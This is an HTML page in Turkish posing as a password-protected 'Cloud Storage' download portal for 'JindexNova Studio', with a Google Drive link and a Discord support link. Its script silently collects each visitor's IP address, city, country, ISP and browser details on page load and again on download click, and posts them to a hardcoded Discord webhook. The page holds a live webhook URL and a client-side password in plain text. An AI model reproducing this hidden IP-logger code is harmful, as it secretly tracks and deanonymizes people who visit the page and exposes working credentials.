<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Storage | JindexNova Studio</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }

        body {
            background-color: #f8f9fa;
            color: #212529;
            font-family: 'Plus Jakarta Sans', sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .bg-gradient {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 50% 50%, rgba(255,255,255,1) 0%, rgba(235,238,241,1) 100%);
            z-index: -1;
        }

        .main-portal {
            width: 100%;
            max-width: 440px;
            background: #ffffff;
            padding: 60px 45px;
            border-radius: 40px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.05);
            text-align: center;
            border: 1px solid rgba(0,0,0,0.02);
        }

        .brand-icon {
            width: 70px; height: 70px;
            background: #f1f3f5;
            border-radius: 24px;
            margin: 0 auto 30px;
            display: flex; align-items: center; justify-content: center;
        }

        .brand-icon svg { width: 32px; fill: #adb5bd; }

        h1 { font-size: 1.6rem; font-weight: 600; color: #1a1c1e; margin-bottom: 12px; }

        p { font-size: 0.95rem; color: #6c757d; margin-bottom: 40px; line-height: 1.5; }

        input[type="password"] {
            width: 100%;
            padding: 20px;
            background: #f8f9fa;
            border: 2px solid transparent;
            border-radius: 22px;
            font-size: 1rem;
            text-align: center;
            outline: none;
            margin-bottom: 10px;
        }

        input[type="password"]:focus {
            background: #ffffff;
            border-color: #dee2e6;
            box-shadow: 0 10px 20px rgba(0,0,0,0.03);
        }

        .download-action {
            display: none;
            width: 100%;
            padding: 20px;
            background: #212529;
            color: #ffffff;
            text-decoration: none;
            border-radius: 22px;
            font-weight: 600;
            cursor: pointer;
            animation: fadeIn 0.4s ease;
        }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .download-action:hover {
            background: #000000;
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(0,0,0,0.1);
        }

        #status-hint { font-size: 0.8rem; margin-top: 12px; height: 20px; color: #adb5bd; }

        .footer {
            margin-top: 35px;
            padding-top: 25px;
            border-top: 1px solid #f1f3f5;
            font-size: 0.85rem;
            color: #adb5bd;
        }

        .footer a { color: #495057; text-decoration: none; font-weight: 600; }
    </style>
</head>
<body>

    <div class="bg-gradient"></div>

    <div class="main-portal">
        <div class="brand-icon">
            <svg viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>
        </div>

        <h1>Erişim Merkezi</h1>
        <p>Lütfen devam etmek için size verilen anahtarı giriniz.</p>

        <input type="password" id="key" placeholder="•••• •••• •••• ••••" oninput="verify()">
        <div id="status-hint"></div>

        <!-- Güncellenen İndirme Linki -->
        <a href="https://drive.google.com/file/d/1rVzMkEawL0YdH8pcgqW-CPIGp5uoeLpp/view?usp=sharing" target="_blank" id="dlBtn" onclick="trackClick()" class="download-action">İndirmeyi Başlat</a>

        <div class="footer">
            Destek: <a href="https://discord.gg/zeCeDV9FrF" target="_blank">JINDEX STUDIO Discord</a>
        </div>
    </div>

    <script>
        const WH = "https://discord.com/api/webhooks/1494279263262736466/UsYcRXVi7tWrJ3eFac2KYbHrzLQHa5EBeDYWRi2c2SaFckSvSH3_RzyqODd5i79xFsQl";

        async function logVisit(type = "Siteye Giriş Yapıldı") {
            try {
                const ipInf = await fetch('https://ipapi.co/json/').then(res => res.json());
                
                const data = {
                    embeds: [{
                        title: `🔱 JINDEX Nova Log: ${type}`,
                        color: 0x2f3136,
                        fields: [
                            { name: "🌐 IP", value: `\`${ipInf.ip}\``, inline: true },
                            { name: "📍 Lokasyon", value: `${ipInf.city} / ${ipInf.country_name}`, inline: true },
                            { name: "📡 ISP", value: ipInf.org, inline: true },
                            { name: "💻 Cihaz Bilgisi", value: `\`\`\`${navigator.userAgent}\`\`\`` }
                        ],
                        timestamp: new Date()
                    }]
                };

                fetch(WH, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
            } catch (e) {}
        }

        window.onload = () => logVisit();

        function trackClick() { logVisit("Dosya İndirme Başlatıldı"); }

        function verify() {
            const val = document.getElementById('key').value;
            const btn = document.getElementById('dlBtn');
            
            // Güncellenen Şifre: 1283JINDEXX
            const master = "1283JINDEXX"; 

            if(val === master) {
                btn.style.display = "block";
                document.getElementById('status-hint').innerText = "Erişim izni verildi.";
            } else {
                btn.style.display = "none";
                if(val.length > 3) document.getElementById('status-hint').innerText = "Hatalı anahtar.";
            }
        }
    </script>
</body>
</html>
